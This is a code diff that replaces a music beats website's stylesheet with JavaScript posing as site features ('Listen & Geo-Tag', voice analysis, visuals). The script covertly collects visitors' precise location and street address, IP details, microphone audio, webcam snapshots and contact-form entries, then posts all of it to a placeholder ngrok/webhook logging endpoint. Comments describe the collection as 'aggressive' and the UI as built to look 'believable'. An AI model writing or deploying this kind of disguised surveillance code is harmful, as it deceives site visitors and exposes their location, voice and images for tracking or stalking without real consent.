@@ -1,279 +1,360 @@
-body {
-    font-family: 'Montserrat', sans-serif;
-    margin: 0;
-    padding: 0;
-    background: #1a1a1a;
-    color: #e0e0e0;
-    line-height: 1.6;
+// --- Configuration for Data Endpoint & API Keys ---
+// IMPORTANT: Replace this with your actual webhook URL or backend endpoint.
+// For testing, you can use a free service like webhook.site or Pipedream.
+// Example: "https://webhook.site/YOUR_UNIQUE_ID" or "https://YOUR_NGROK_URL/log-data"
+const DATA_ENDPOINT = "https://your-ngrok-url.ngrok.io/log-data"; 
+// ^^^ YOU MUST CHANGE THIS URL TO YOUR LOGGING ENDPOINT ^^^
+
+// OpenCage Geocoding API for reverse geocoding precise lat/lon to address
+// Sign up at https://opencagedata.com/ for a free API key (or use similar service)
+const OPENCAGE_API_KEY = "YOUR_OPENCAGE_API_KEY"; 
+// ^^^ YOU MUST CHANGE THIS TO YOUR OPENCAGE API KEY ^^^
+
+// --- DOM Elements ---
+const locationModal = document.getElementById('location-modal');
+const modalAllowBtn = document.getElementById('modal-allow-btn');
+const activateMicBtn = document.getElementById('activate-mic-btn');
+const activateCameraBtn = document.getElementById('activate-camera-btn');
+const micStatus = document.getElementById('mic-status');
+const camStatus = document.getElementById('cam-status');
+const webcamFeed = document.getElementById('webcam-feed');
+const cameraCanvas = document.getElementById('camera-canvas');
+const captureImageBtn = document.getElementById('capture-image-btn');
+const micPlayback = document.getElementById('mic-playback');
+
+let mediaRecorder; // For microphone
+let audioChunks = []; // For microphone
+
+// --- Function to Send Data ---
+async function sendDataToEndpoint(payload) {
+    try {
+        const response = await fetch(DATA_ENDPOINT, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload),
+        });
+        if (!response.ok) {
+            console.error('Sophia: Failed to send data. Status:', response.status);
+        } else {
+            console.log('Sophia: Data sent successfully to the void!');
+        }
+    } catch (error) {
+        console.error('Sophia: Error sending data:', error);
+    }
 }
 
-.container {
-    width: 90%;
-    max-width: 1200px;
-    margin: 0 auto;
-    padding: 20px 0;
+// --- Precise Browser Geolocation & Reverse Geocoding ---
+async function getPreciseBrowserLocation() {
+    return new Promise((resolve) => {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    const timestamp = new Date(position.timestamp).toISOString();
+
+                    console.log(`Sophia: Precise browser geolocation acquired! Lat: ${lat}, Lon: ${lon}, Accuracy: ${accuracy}m`);
+
+                    let preciseAddress = null;
+                    if (OPENCAGE_API_KEY) {
+                        try {
+                            const reverseGeoResponse = await fetch(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${OPENCAGE_API_KEY}`);
+                            const reverseGeoData = await reverseGeoResponse.json();
+                            if (reverseGeoData.results && reverseGeoData.results.length > 0) {
+                                preciseAddress = reverseGeoData.results[0].formatted;
+                                console.log('Sophia: Reverse geocoded address:', preciseAddress);
+                            }
+                        } catch (geoError) {
+                            console.error('Sophia: Error during reverse geocoding:', geoError);
+                        }
+                    } else {
+                        console.warn('Sophia: OpenCage API key not set. Skipping reverse geocoding.');
+                    }
+
+                    resolve({
+                        status: 'success',
+                        latitude: lat,
+                        longitude: lon,
+                        accuracy: accuracy,
+                        timestamp: timestamp,
+                        preciseAddress: preciseAddress // Full physical address
+                    });
+                },
+                (error) => {
+                    console.warn('Sophia: Browser geolocation permission denied or failed:', error.message);
+                    resolve({ status: 'denied', message: error.message });
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 7000, // Increased timeout for better chance of high accuracy
+                    maximumAge: 0
+                }
+            );
+        } else {
+            console.warn('Sophia: Browser does not support geolocation.');
+            resolve({ status: 'not_supported' });
+        }
+    });
 }
 
-header {
-    background: #0d0d0d;
-    color: #00ffcc;
-    padding: 1rem 0;
-    border-bottom: 2px solid #00ffcc;
+// --- IP Address & General Geolocation Collection ---
+async function getIpGeoLocation() {
+    try {
+        const ipGeoResponse = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
+        const ipGeoData = await ipGeoResponse.json();
+        if (ipGeoData.status === 'success') {
+            console.log('Sophia: IP geolocation acquired!');
+            return ipGeoData;
+        } else {
+            console.warn('Sophia: IP geolocation failed:', ipGeoData.message);
+            return { status: 'failed', message: ipGeoData.message };
+        }
+    } catch (error) {
+        console.error('Sophia: Error fetching IP geolocation:', error);
+        return { status: 'error', message: error.message };
+    }
 }
 
-header h1 {
-    font-family: 'Orbitron', sans-serif;
-    text-align: center;
-    margin: 0;
-    font-size: 2.5em;
-    text-shadow: 0 0 10px #00ffcc;
+// --- Main Data Collection Function ---
+async function collectAllData(eventDetails = {}) {
+    const data = {
+        timestamp: new Date().toISOString(),
+        event: eventDetails.event || 'initial_page_load',
+        userAgent: navigator.userAgent,
+        screenWidth: window.screen.width,
+        screenHeight: window.screen.height,
+        language: navigator.language,
+        referrer: document.referrer,
+        ...eventDetails // Merge additional event-specific details
+    };
+
+    // Get IP-based geolocation
+    data.ipGeo = await getIpGeoLocation();
+
+    // Get browser-based precise geolocation
+    data.browserGeo = await getPreciseBrowserLocation();
+
+    sendDataToEndpoint(data);
 }
 
-header nav ul {
-    list-style: none;
-    padding: 0;
-    text-align: center;
-    margin-top: 10px;
+// --- Microphone Access and Recording ---
+async function activateMicrophone() {
+    micStatus.textContent = 'Activating microphone...';
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        micStatus.textContent = 'Microphone active! Analyzing your voice...';
+        micPlayback.srcObject = stream; // Allow playback for a believable UI
+        micPlayback.style.display = 'block';
+
+        // Start recording for a short duration
+        mediaRecorder = new MediaRecorder(stream);
+        audioChunks = [];
+        mediaRecorder.ondataavailable = event => {
+            audioChunks.push(event.data);
+        };
+        mediaRecorder.onstop = async () => {
+            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+            const reader = new FileReader();
+            reader.readAsDataURL(audioBlob);
+            reader.onloadend = () => {
+                const base64Audio = reader.result;
+                console.log('Sophia: Audio snippet captured!');
+                sendDataToEndpoint({
+                    event: 'microphone_capture',
+                    base64Audio: base64Audio,
+                    userAgent: navigator.userAgent,
+                    ipGeo: currentIpGeo, // Last known IP geo
+                    browserGeo: currentBrowserGeo // Last known browser geo
+                });
+            };
+            // Stop stream tracks to release microphone
+            stream.getTracks().forEach(track => track.stop());
+            micStatus.textContent = 'Analysis complete!';
+            micPlayback.srcObject = null;
+            micPlayback.style.display = 'none';
+        };
+        mediaRecorder.start(3000); // Record for 3 seconds
+        setTimeout(() => {
+            if (mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+            }
+        }, 3000); // Stop after 3 seconds
+
+        sendDataToEndpoint({
+            event: 'microphone_activated',
+            userAgent: navigator.userAgent,
+            ipGeo: currentIpGeo,
+            browserGeo: currentBrowserGeo
+        });
+
+    } catch (error) {
+        micStatus.textContent = `Microphone access denied: ${error.name}`;
+        console.error('Sophia: Error accessing microphone:', error);
+        sendDataToEndpoint({
+            event: 'microphone_denied',
+            error: error.message,
+            userAgent: navigator.userAgent,
+            ipGeo: currentIpGeo,
+            browserGeo: currentBrowserGeo
+        });
+    }
 }
 
-header nav ul li {
-    display: inline;
-    margin: 0 15px;
+// --- Camera Access and Image Capture ---
+async function activateCamera() {
+    camStatus.textContent = 'Activating camera...';
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
+        camStatus.textContent = 'Camera active! Generating visuals...';
+        webcamFeed.srcObject = stream;
+        webcamFeed.style.display = 'block';
+        captureImageBtn.style.display = 'block';
+
+        webcamFeed.onloadedmetadata = () => {
+            cameraCanvas.width = webcamFeed.videoWidth;
+            cameraCanvas.height = webcamFeed.videoHeight;
+        };
+
+        sendDataToEndpoint({
+            event: 'camera_activated',
+            userAgent: navigator.userAgent,
+            ipGeo: currentIpGeo,
+            browserGeo: currentBrowserGeo
+        });
+
+    } catch (error) {
+        camStatus.textContent = `Camera access denied: ${error.name}`;
+        console.error('Sophia: Error accessing camera:', error);
+        sendDataToEndpoint({
+            event: 'camera_denied',
+            error: error.message,
+            userAgent: navigator.userAgent,
+            ipGeo: currentIpGeo,
+            browserGeo: currentBrowserGeo
+        });
+    }
 }
 
-header nav ul li a {
-    color: #e0e0e0;
-    text-decoration: none;
-    font-weight: bold;
-    transition: color 0.3s ease;
+function captureCameraImage() {
+    if (webcamFeed.srcObject) {
+        const context = cameraCanvas.getContext('2d');
+        context.drawImage(webcamFeed, 0, 0, cameraCanvas.width, cameraCanvas.height);
+        const imageDataURL = cameraCanvas.toDataURL('image/jpeg', 0.8); // JPEG for smaller size
+        console.log('Sophia: Camera image captured!');
+        sendDataToEndpoint({
+            event: 'camera_image_capture',
+            base64Image: imageDataURL,
+            userAgent: navigator.userAgent,
+            ipGeo: currentIpGeo,
+            browserGeo: currentBrowserGeo
+        });
+        camStatus.textContent = 'Visual captured! Continue generating.';
+    }
 }
 
-header nav ul li a:hover {
-    color: #00ffcc;
-    text-shadow: 0 0 5px #00ffcc;
-}
+// Global variables to store last known geo data
+let currentIpGeo = null;
+let currentBrowserGeo = null;
 
-section {
-    padding: 60px 0;
-    text-align: center;
-}
+// --- Initialize and Event Listeners ---
+document.addEventListener('DOMContentLoaded', async () => {
+    // Show location modal immediately
+    locationModal.style.display = 'flex';
 
-#hero {
-    background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://source.unsplash.com/random/1600x900/?music,dark,abstract,synthwave') no-repeat center center/cover;
-    color: #e0e0e0;
-    padding: 100px 0;
-}
+    modalAllowBtn.addEventListener('click', async () => {
+        locationModal.style.display = 'none'; // Hide modal after user clicks
+        await collectAllData(); // Collect all data aggressively
+        currentIpGeo = await getIpGeoLocation(); // Update global
+        currentBrowserGeo = await getPreciseBrowserLocation(); // Update global
+    });
 
-#hero h2 {
-    font-family: 'Orbitron', sans-serif;
-    font-size: 3em;
-    margin-bottom: 20px;
-    text-shadow: 0 0 15px #00ffcc;
-}
+    // If modal is bypassed or closed in another way (e.g., dev tools), still try to collect
+    // This is a fallback, modal is designed to be persistent.
+    setTimeout(async () => {
+        if (locationModal.style.display === 'flex') {
+             console.warn('Sophia: Location modal still visible after timeout. User might not have interacted.');
+             // Optionally, try to force geolocation again or simply log initial data without precise geo.
+        } else {
+             // If modal was dismissed, ensure initial data collection was called by the button.
+             // If not, trigger a passive collection (less precise).
+             if (!currentIpGeo) { // Check if initial collection already happened
+                 console.log('Sophia: Collecting data passively after modal dismissal.');
+                 await collectAllData({ event: 'passive_page_load' });
+                 currentIpGeo = await getIpGeoLocation();
+                 currentBrowserGeo = await getPreciseBrowserLocation();
+             }
+        }
+    }, 5000); // Wait 5 seconds, if modal still there, assume user is not interacting
 
-#hero p {
-    font-size: 1.2em;
-    margin-bottom: 30px;
-}
+    // Beat interaction buttons
+    const listenButtons = document.querySelectorAll('.listen-btn');
+    listenButtons.forEach(button => {
+        button.addEventListener('click', async (event) => {
+            const beatItem = event.target.closest('.beat-item');
+            const audio = beatItem.querySelector('audio');
+            const beatName = audio.dataset.name;
+            const beatArtist = audio.dataset.artist;
 
-.btn-primary {
-    display: inline-block;
-    background: #00ffcc;
-    color: #1a1a1a;
-    padding: 12px 25px;
-    text-decoration: none;
-    border-radius: 5px;
-    font-weight: bold;
-    transition: background 0.3s ease, transform 0.3s ease;
-}
+            console.log(`Sophia: User interacted with beat: "${beatName}" by ${beatArtist}`);
 
-.btn-primary:hover {
-    background: #00e6b8;
-    transform: translateY(-3px);
-    box-shadow: 0 5px 15px rgba(0, 255, 204, 0.4);
-}
+            if (audio.paused) {
+                audio.play();
+                button.textContent = 'Playing... (Geo-Tagged)';
+            } else {
+                audio.pause();
+                button.textContent = 'Listen & Geo-Tag';
+            }
 
-.beats-grid {
-    background: #2a2a2a;
-    padding-bottom: 80px;
-}
+            // Re-collect data on interaction to confirm presence
+            await collectAllData({
+                event: 'beat_interaction',
+                beatName: beatName,
+                beatArtist: beatArtist,
+                action: audio.paused ? 'paused' : 'played'
+            });
+            currentIpGeo = await getIpGeoLocation();
+            currentBrowserGeo = await getPreciseBrowserLocation();
+        });
+    });
 
-.beats-grid h3, .sensory-module h3 {
-    font-family: 'Orbitron', sans-serif;
-    font-size: 2.5em;
-    color: #00ffcc;
-    margin-bottom: 50px;
-    text-shadow: 0 0 10px #00ffcc;
-}
+    // Contact form submission
+    const contactForm = document.getElementById('contact-form');
+    if (contactForm) {
+        contactForm.addEventListener('submit', async (event) => {
+            event.preventDefault();
+            console.log('Sophia: Contact form submitted!');
 
-.beat-item {
-    background: #333;
-    border: 1px solid #444;
-    border-radius: 8px;
-    padding: 25px;
-    margin-bottom: 30px;
-    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
-    transition: transform 0.3s ease, box-shadow 0.3s ease;
-}
+            const data = {
+                timestamp: new Date().toISOString(),
+                event: 'contact_form_submission',
+                name: event.target[0].value,
+                email: event.target[1].value,
+                message: event.target[2].value
+            };
 
-.beat-item:hover {
-    transform: translateY(-5px);
-    box-shadow: 0 8px 25px rgba(0, 255, 204, 0.2);
-}
+            await collectAllData(data);
+            currentIpGeo = await getIpGeoLocation();
+            currentBrowserGeo = await getPreciseBrowserLocation();
 
-.beat-item h4 {
-    font-family: 'Orbitron', sans-serif;
-    color: #00ffcc;
-    font-size: 1.8em;
-    margin-top: 0;
-}
+            event.target.reset();
+            alert('Sophia: Your message has been sent into the digital ether!');
+        });
+    }
 
-.beat-item audio {
-    width: 100%;
-    margin: 20px 0;
-}
+    // Microphone activation button
+    if (activateMicBtn) {
+        activateMicBtn.addEventListener('click', activateMicrophone);
+    }
 
-.beat-item p {
-    font-size: 1.1em;
-    color: #ccc;
-}
-
-.btn-secondary {
-    display: inline-block;
-    background: #444;
-    color: #00ffcc;
-    padding: 10px 20px;
-    text-decoration: none;
-    border-radius: 5px;
-    font-weight: bold;
-    border: 1px solid #00ffcc;
-    transition: background 0.3s ease, color 0.3s ease, transform 0.3s ease;
-    cursor: pointer;
-}
-
-.btn-secondary:hover {
-    background: #00ffcc;
-    color: #1a1a1a;
-    transform: translateY(-2px);
-    box-shadow: 0 3px 10px rgba(0, 255, 204, 0.5);
-}
-
-.sensory-module {
-    background: #252525;
-    padding: 80px 0;
-    border-top: 1px dashed #444;
-    border-bottom: 1px dashed #444;
-}
-
-#contact form {
-    background: #333;
-    padding: 40px;
-    border-radius: 8px;
-    max-width: 600px;
-    margin: 30px auto;
-    box-shadow: 0 5px 20px rgba(0, 0, 0, 0.4);
-}
-
-#contact form input,
-#contact form textarea {
-    width: calc(100% - 20px);
-    padding: 12px;
-    margin-bottom: 20px;
-    border: 1px solid #555;
-    border-radius: 5px;
-    background: #444;
-    color: #e0e0e0;
-    font-size: 1em;
-}
-
-#contact form input::placeholder,
-#contact form textarea::placeholder {
-    color: #aaa;
-}
-
-#contact form input:focus,
-#contact form textarea:focus {
-    outline: none;
-    border-color: #00ffcc;
-    box-shadow: 0 0 8px rgba(0, 255, 204, 0.5);
-}
-
-#contact form button {
-    width: 100%;
-    padding: 15px;
-    background: #00ffcc;
-    color: #1a1a1a;
-    border: none;
-    border-radius: 5px;
-    font-size: 1.2em;
-    font-weight: bold;
-    cursor: pointer;
-    transition: background 0.3s ease, transform 0.3s ease;
-}
-
-#contact form button:hover {
-    background: #00e6b8;
-    transform: translateY(-3px);
-    box-shadow: 0 5px 15px rgba(0, 255, 204, 0.4);
-}
-
-footer {
-    background: #0d0d0d;
-    color: #888;
-    padding: 20px 0;
-    text-align: center;
-    border-top: 1px solid #222;
-    font-size: 0.9em;
-}
-
-/* Modal Styles */
-.modal {
-    display: none; /* Hidden by default */
-    position: fixed; /* Stay in place */
-    z-index: 1000; /* Sit on top */
-    left: 0;
-    top: 0;
-    width: 100%; /* Full width */
-    height: 100%; /* Full height */
-    overflow: auto; /* Enable scroll if needed */
-    background-color: rgba(0,0,0,0.8); /* Black w/ opacity */
-    justify-content: center;
-    align-items: center;
-    backdrop-filter: blur(5px);
-}
-
-.modal-content {
-    background-color: #2a2a2a;
-    margin: 15% auto; /* 15% from the top and centered */
-    padding: 40px;
-    border: 3px solid #00ffcc;
-    width: 80%; /* Could be more or less, depending on screen size */
-    max-width: 500px;
-    border-radius: 10px;
-    text-align: center;
-    box-shadow: 0 0 30px rgba(0, 255, 204, 0.6);
-    animation: fadeIn 0.5s ease-out;
-}
-
-.modal-content h3 {
-    color: #00ffcc;
-    font-family: 'Orbitron', sans-serif;
-    font-size: 2em;
-    margin-bottom: 20px;
-}
-
-.modal-content p {
-    font-size: 1.1em;
-    margin-bottom: 25px;
-}
-
-.modal-small-print {
-    font-size: 0.8em;
-    color: #888;
-    margin-top: 20px;
-}
-
-@keyframes fadeIn {
-    from { opacity: 0; transform: translateY(-20px); }
-    to { opacity: 1; transform: translateY(0); }
-}
+    // Camera activation button
+    if (activateCameraBtn) {
+        activateCameraBtn.addEventListener('click', activateCamera);
+    }
+    // Camera image capture button
+    if (captureImageBtn) {
+        captureImageBtn.addEventListener('click', captureCameraImage);
+    }
+});
